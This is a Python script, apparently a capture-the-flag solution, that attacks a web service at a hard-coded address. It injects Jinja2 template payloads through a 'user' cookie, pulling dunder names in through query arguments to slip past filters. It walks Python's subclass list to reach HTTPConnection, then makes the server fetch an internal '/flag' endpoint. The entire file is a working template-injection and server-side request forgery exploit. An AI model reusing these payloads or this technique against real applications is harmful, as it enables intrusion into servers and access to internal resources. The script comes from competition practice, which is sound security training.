import re
from requests import Session

# BASE_URL = "http://localhost:5005"
BASE_URL = "http://34.124.157.94:5005"
FLAG_FORMAT = re.compile(r"grey{.*?}")

with Session() as s:
    response1 = s.get(
        f"{BASE_URL}/?service=adminpage&cl=__class__&mro=__mro__&sub=__subclasses__&getitem=__getitem__",
        cookies={
            'user': """{{""|attr(request.args.cl)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.sub)()}}"""
        }
    )

    # Find request object
    c1=response1.content.decode()
    sub_classes = c1.split(',')

    request_lib = list(filter(lambda x: 'http.client.HTTPConnection' in x, sub_classes))
    if len(request_lib) == 0:
        print("No object found to make HTTP request")
        print(c1)
        exit(1)

    index = sub_classes.index(request_lib[0])
    response = s.get(
        f"{BASE_URL}/?service=adminpage&cl=__class__&mro=__mro__&sub=__subclasses__&getitem=__getitem__",
        cookies={
            "user": """{%set conn=""|attr(request.args.cl)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.sub)()|attr(request.args.getitem)("""
            f"{index}"
            """)("rflagpage")%}{{conn.request("GET","/flag")}}{{conn.getresponse().read()}}"""
        },
    )
    content = response.content.decode()
    result = FLAG_FORMAT.search(content)

    if result is not None:
        print(f"Flag: {result.group(0)}")
    else:
        print("No flag found")
        print("Content: ", content)
